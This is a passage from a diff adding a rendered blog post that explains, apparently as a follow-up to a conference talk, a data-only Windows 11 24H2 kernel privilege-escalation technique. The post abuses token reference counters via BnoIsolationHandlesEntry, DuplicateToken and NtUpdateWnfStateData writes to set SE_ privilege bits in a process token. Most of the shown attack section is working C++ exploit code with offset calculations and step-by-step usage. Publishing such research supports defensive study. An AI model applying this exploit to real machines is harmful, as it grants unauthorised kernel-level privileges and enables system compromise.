+	<span class="n">SeTakeOwnershipPrivilege</span> <span class="o">=</span> <span class="mh">0x9</span><span class="p">,</span>
+	<span class="n">SeLoadDriverPrivilege</span> <span class="o">=</span> <span class="mh">0xa</span><span class="p">,</span>
+	<span class="n">SeSystemProfilePrivilege</span> <span class="o">=</span> <span class="mh">0xb</span><span class="p">,</span>
+	<span class="n">SeSystemtimePrivilege</span> <span class="o">=</span> <span class="mh">0xc</span><span class="p">,</span>
+	<span class="n">SeProfileSingleProcessPrivilege</span> <span class="o">=</span> <span class="mh">0xd</span><span class="p">,</span>
+	<span class="n">SeIncreaseBasePriorityPrivilege</span> <span class="o">=</span> <span class="mh">0xe</span><span class="p">,</span>
+	<span class="n">SeCreatePagefilePrivilege</span> <span class="o">=</span> <span class="mh">0xf</span><span class="p">,</span>
+	<span class="n">SeCreatePermanentPrivilege</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">,</span>
+	<span class="n">SeBackupPrivilege</span> <span class="o">=</span> <span class="mh">0x11</span><span class="p">,</span>
+	<span class="n">SeRestorePrivilege</span> <span class="o">=</span> <span class="mh">0x12</span><span class="p">,</span>
+	<span class="n">SeShutdownPrivilege</span> <span class="o">=</span> <span class="mh">0x13</span><span class="p">,</span>
+	<span class="n">SeDebugPrivilege</span> <span class="o">=</span> <span class="mh">0x14</span><span class="p">,</span>
+	<span class="n">SeAuditPrivilege</span> <span class="o">=</span> <span class="mh">0x15</span><span class="p">,</span>
+	<span class="n">SeSystemEnvironmentPrivilege</span> <span class="o">=</span> <span class="mh">0x16</span><span class="p">,</span>
+	<span class="n">SeChangeNotifyPrivilege</span> <span class="o">=</span> <span class="mh">0x17</span><span class="p">,</span>
+	<span class="n">SeRemoteShutdownPrivilege</span> <span class="o">=</span> <span class="mh">0x18</span><span class="p">,</span>
+	<span class="n">SeUndockPrivilege</span> <span class="o">=</span> <span class="mh">0x19</span><span class="p">,</span>
+	<span class="n">SeSyncAgentPrivilege</span> <span class="o">=</span> <span class="mh">0x1a</span><span class="p">,</span>
+	<span class="n">SeEnableDelegationPrivilege</span> <span class="o">=</span> <span class="mh">0x1b</span><span class="p">,</span>
+	<span class="n">SeManageVolumePrivilege</span> <span class="o">=</span> <span class="mh">0x1c</span><span class="p">,</span>
+	<span class="n">SeImpersonatePrivilege</span> <span class="o">=</span> <span class="mh">0x1d</span><span class="p">,</span>
+	<span class="n">SeCreateGlobalPrivilege</span> <span class="o">=</span> <span class="mh">0x1e</span><span class="p">,</span>
+	<span class="n">SeTrustedCredManAccessPrivilege</span> <span class="o">=</span> <span class="mh">0x1f</span><span class="p">,</span>
+	<span class="n">SeRelabelPrivilege</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">,</span>
+	<span class="n">SeIncreaseWorkingSetPrivilege</span> <span class="o">=</span> <span class="mh">0x21</span><span class="p">,</span>
+	<span class="n">SeTimeZonePrivilege</span> <span class="o">=</span> <span class="mh">0x22</span><span class="p">,</span>
+	<span class="n">SeCreateSymbolicLinkPrivilege</span> <span class="o">=</span> <span class="mh">0x23</span><span class="p">,</span>
+	<span class="n">SeDelegateSessionUserImpersonatePrivilege</span>  <span class="o">=</span> <span class="mh">0x24</span>
+<span class="p">}</span> <span class="n">PRIV</span><span class="p">;</span>
+</code></pre></div></div>
+<p>The value inside <code class="language-plaintext highlighter-rouge">PRIV</code> is the bit offset which must be 1 inside the 8 byte fields of <code class="language-plaintext highlighter-rouge">Present</code> and <code class="language-plaintext highlighter-rouge">Enabled</code> so the privilege can be used by the process.</p>
+
+<p>There is only one slight problem, we have a byte precision increment and we need to flip a bit. 
+The first thing we need to know is which byte we need to increment. We called this <code class="language-plaintext highlighter-rouge">offset</code>. We can calculate this by dividing the <code class="language-plaintext highlighter-rouge">PRIV</code> by 8 with an integer division.</p>
+
+<p>Now we need to calculate how many times we need to increment our target byte. For that we just check the last byte of our privilege and see which bit we need to flip. We named this property <code class="language-plaintext highlighter-rouge">amount</code> (I know pretty genius names…):</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_PrivOffsets</span> <span class="p">{</span>
+	<span class="kt">uint16_t</span> <span class="n">amount</span><span class="p">;</span>
+	<span class="kt">uint16_t</span> <span class="n">offset</span><span class="p">;</span>
+	<span class="p">}</span> <span class="n">PrivOffsets</span><span class="p">;</span>
+
+<span class="k">consteval</span> <span class="n">PrivOffsets</span> <span class="nf">CalcPrivIncrement</span><span class="p">(</span><span class="n">PRIV</span> <span class="n">priv</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">PrivOffsets</span> <span class="n">offset</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+	<span class="n">offset</span><span class="p">.</span><span class="n">offset</span> <span class="o">=</span> <span class="n">priv</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span>
+	<span class="n">offset</span><span class="p">.</span><span class="n">amount</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span>  <span class="p">((</span><span class="n">priv</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">));</span>
+	<span class="k">return</span> <span class="n">offset</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p><strong>Please note:</strong> I accidentally included a screenshot of the wrong <code class="language-plaintext highlighter-rouge">offset</code> calculation in my BH presentation (Shame on me). I fixed it here. Sorry about that!</p>
+
+<h3 id="usage">Usage</h3>
+<p>Now lets put our new primitive to use:</p>
+<ol>
+  <li>We point <code class="language-plaintext highlighter-rouge">token-&gt;BnoIsolationHandlesEntry</code> (from the token we r/w into) to our process tokens <code class="language-plaintext highlighter-rouge">_TOKEN.Privileges.Present</code> - 0x18 + <code class="language-plaintext highlighter-rouge">privs.offset</code></li>
+  <li>Duplicate the controlled token for <code class="language-plaintext highlighter-rouge">privs.amount</code></li>
+  <li>Point <code class="language-plaintext highlighter-rouge">token-&gt;BnoIsolationHandlesEntry</code> (from the token we r/w into) to our process tokens <code class="language-plaintext highlighter-rouge">_TOKEN.Privileges.Enabled</code> - 0x18 + <code class="language-plaintext highlighter-rouge">privs.offset</code></li>
+  <li>Duplicate the controlled token for <code class="language-plaintext highlighter-rouge">privs.amount</code></li>
+  <li>Enjoy your <code class="language-plaintext highlighter-rouge">SE_Privileges</code></li>
+</ol>
+
+<p>My code looks something like this:</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span><span class="o">*</span> <span class="n">buf_pres</span> <span class="o">=</span> <span class="p">(</span><span class="n">HANDLE</span><span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="n">privs</span><span class="p">.</span><span class="n">amount</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">HANDLE</span><span class="p">));</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">buf_pres</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="n">HANDLE</span><span class="o">*</span> <span class="n">buf_en</span> <span class="o">=</span> <span class="p">(</span><span class="n">HANDLE</span><span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="n">privs</span><span class="p">.</span><span class="n">amount</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">HANDLE</span><span class="p">));</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">buf_en</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// use arbitrary increment on present (+0x40) -0x18 for the offset of the ref counter in BnoIsolationHandlesEntry</span>
+<span class="n">token</span><span class="o">-&gt;</span><span class="n">BnoIsolationHandlesEntry</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)(</span><span class="n">process_token_addr</span> <span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="n">_TOKEN</span><span class="p">,</span> <span class="n">Privileges</span><span class="p">)</span> <span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="n">_SEP_TOKEN_PRIVILEGES</span><span class="p">,</span> <span class="n">Present</span><span class="p">)</span> <span class="o">+</span> <span class="n">privs</span><span class="p">.</span><span class="n">offset</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">);</span>
+<span class="n">NTSTATUS</span> <span class="n">set_res</span> <span class="o">=</span> <span class="n">lNtUpdateWnfStateData</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">curr_wnf_buf</span><span class="p">,</span> <span class="n">buf_size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">TypeID</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">privs</span><span class="p">.</span><span class="n">amount</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">bool</span> <span class="n">bool_result</span> <span class="o">=</span> <span class="n">DuplicateToken</span><span class="p">(</span><span class="n">manipulated_token</span><span class="p">,</span> <span class="n">SecurityAnonymous</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf_pres</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bool_result</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"Duplicate token failed pres</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+<span class="c1">// use arbitrary increment on enabled (+0x48) -0x18 for the offset of the ref counter in BnoIsolationHandlesEntry</span>
+<span class="n">token</span><span class="o">-&gt;</span><span class="n">BnoIsolationHandlesEntry</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)(</span><span class="n">process_token_addr</span> <span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="n">_TOKEN</span><span class="p">,</span> <span class="n">Privileges</span><span class="p">)</span> <span class="o">+</span> <span class="n">offsetof</span><span class="p">(</span><span class="n">_SEP_TOKEN_PRIVILEGES</span><span class="p">,</span> <span class="n">Enabled</span><span class="p">)</span> <span class="o">+</span> <span class="n">privs</span><span class="p">.</span><span class="n">offset</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">);</span>
+<span class="n">set_res</span> <span class="o">=</span> <span class="n">lNtUpdateWnfStateData</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">curr_wnf_buf</span><span class="p">,</span> <span class="n">buf_size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">TypeID</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">privs</span><span class="p">.</span><span class="n">amount</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">bool</span> <span class="n">bool_result</span> <span class="o">=</span> <span class="n">DuplicateToken</span><span class="p">(</span><span class="n">manipulated_token</span><span class="p">,</span> <span class="n">SecurityAnonymous</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf_en</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bool_result</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"Duplicate token failed pres</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+<span class="c1">// set the BnoIsolationHandlesEntry to NULL so we can close the modified token without crashing</span>
+<span class="n">token</span><span class="o">-&gt;</span><span class="n">BnoIsolationHandlesEntry</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="n">set_res</span> <span class="o">=</span> <span class="n">lNtUpdateWnfStateData</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">curr_wnf_buf</span><span class="p">,</span> <span class="n">buf_size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">TypeID</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>When you finished enjoying your <code class="language-plaintext highlighter-rouge">SE_Privileges</code>, you can simply close the handles and the privilege will be gone again:</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">res</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">privs</span><span class="p">.</span><span class="n">amount</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">res</span> <span class="o">=</span> <span class="n">CloseHandle</span><span class="p">(</span><span class="n">buf_en</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+	<span class="n">res</span> <span class="o">=</span> <span class="n">CloseHandle</span><span class="p">(</span><span class="n">buf_pres</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+<span class="p">}</span>
+<span class="n">free</span><span class="p">(</span><span class="n">buf_en</span><span class="p">);</span>
+<span class="n">free</span><span class="p">(</span><span class="n">buf_pres</span><span class="p">);</span>
+</code></pre></div></div>
+<h2 id="closing-thoughts">Closing thoughts</h2>
+<p>So this technique is nothing revolutionary. We just ported an data-only attack technique to 24H2 with a little trick abusing reference counters.
+I’m far from an expert in Windows Kernel exploitation. I just wanted to share the reference counter trick and document the entire exploitation strategy. I hope somebody maybe find it useful.</p>
+
+<p>And if you find any errors please tell me and I will fix them :)</p>
+</div>
+        
+
+    
+
+    
+
+
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+
+
+  <div class="bottom">
+  <div class="container relative">
+    <div class="row align-items-center justify-content-between">
+      <div class="col-auto">
+       
+        
+          <div class="menu-bottom">
+  <ul>
+    
+  </ul>
+</div>
+        
+        
+          <a href="#" data-cc="c-settings">Cookies</a>
+        
+        
+          <div class="copyright">© 2025 by me :)</div>
+        
+        
+        
+          <a class="feed" href="http://localhost:4000/feed.xml">
+            <i class="fas fa-feed"></i>
+          </a>
+        
+        
+      </div>
+      
+        <div class="col-auto">
+          <div class="dark-mode-switcher " id="dark-mode-container">
+  <div class="dark-mode-switch">
+    <svg class="dark-mode-icon-dark" data-name="Layer 1" fill="#000000" height="20px" viewbox="0 0 64 64" width="20px" x="0px" xmlns="http://www.w3.org/2000/svg" y="0px">
+      <title>essential</title>
+      <path d="M33.28,58.24A26.95,26.95,0,0,1,24,6l.39-.13a2,2,0,0,1,2.4,2.87,22.42,22.42,0,0,0-1.51,18.75h0A22.47,22.47,0,0,0,54.09,40.8l.76-.3a2,2,0,0,1,2.24.48,2,2,0,0,1,.35,2.24,27,27,0,0,1-24.16,15ZM21.11,11.85a22.94,22.94,0,1,0,30,33.91A26.46,26.46,0,0,1,21.53,28.87h0A26.4,26.4,0,0,1,21.11,11.85Z"></path>
+    </svg>
+    <svg class="dark-mode-icon-light" fill="#000000" height="20px" style="enable-background: new 0 0 100 100;" version="1.1" viewbox="0 0 100 100" width="20px" x="0px" xml:space="preserve" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns="http://www.w3.org/2000/svg" y="0px">
+      <g>
+        <path d="M50,75c-13.8,0-25-11.2-25-25s11.2-25,25-25s25,11.2,25,25S63.8,75,50,75z M50,33.3c-9.2,0-16.7,7.5-16.7,16.7   c0,9.2,7.5,16.7,16.7,16.7c9.2,0,16.7-7.5,16.7-16.7C66.7,40.8,59.2,33.3,50,33.3z"></path>
+      </g>
+      <g>
+        <path d="M50,100c-2.3,0-4.2-1.9-4.2-4.2v-8.3c0-2.3,1.9-4.2,4.2-4.2c2.3,0,4.2,1.9,4.2,4.2v8.3C54.2,98.1,52.3,100,50,100z    M17.5,86.7c-1.1,0-2.1-0.4-2.9-1.2c-1.6-1.6-1.6-4.3,0-5.9l5.8-5.8c1.6-1.6,4.3-1.6,5.9,0c1.6,1.6,1.6,4.3,0,5.9l-5.8,5.8   C19.6,86.3,18.6,86.7,17.5,86.7z M82.5,86.7c-1.1,0-2.1-0.4-2.9-1.2l-5.8-5.8c-1.6-1.6-1.6-4.3,0-5.9s4.3-1.6,5.9,0l5.8,5.8   c1.6,1.6,1.6,4.3,0,5.9C84.6,86.3,83.6,86.7,82.5,86.7z M95.8,54.2h-8.3c-2.3,0-4.2-1.9-4.2-4.2c0-2.3,1.9-4.2,4.2-4.2h8.3   c2.3,0,4.2,1.9,4.2,4.2C100,52.3,98.1,54.2,95.8,54.2z M12.5,54.2H4.2C1.9,54.2,0,52.3,0,50c0-2.3,1.9-4.2,4.2-4.2h8.3   c2.3,0,4.2,1.9,4.2,4.2C16.7,52.3,14.8,54.2,12.5,54.2z M76.7,27.5c-1.1,0-2.1-0.4-2.9-1.2c-1.6-1.6-1.6-4.3,0-5.9l5.8-5.8   c1.6-1.6,4.3-1.6,5.9,0c1.6,1.6,1.6,4.3,0,5.9l-5.8,5.8C78.8,27.1,77.7,27.5,76.7,27.5z M23.3,27.5c-1.1,0-2.1-0.4-2.9-1.2   l-5.8-5.8c-1.6-1.6-1.6-4.3,0-5.9c1.6-1.6,4.3-1.6,5.9,0l5.8,5.8c1.6,1.6,1.6,4.3,0,5.9C25.5,27.1,24.4,27.5,23.3,27.5z M50,16.7   c-2.3,0-4.2-1.9-4.2-4.2V4.2C45.8,1.9,47.7,0,50,0c2.3,0,4.2,1.9,4.2,4.2v8.3C54.2,14.8,52.3,16.7,50,16.7z"></path>
+      </g>
+    </svg>
+    <div class="ball"></div>
+  </div>
+</div>
+        </div>
+         
+    </div>
+  </div>
+</div>
+
+
+<script type="text/javascript" src="/assets/js/scripts.js"></script>
+
+<script type="text/javascript" src="/assets/js/hamburger.js"></script>
+<script type="text/javascript" src="/assets/js/darkModeSwitch.js"></script>
+
+
+
+
+
+</body>
+</html>
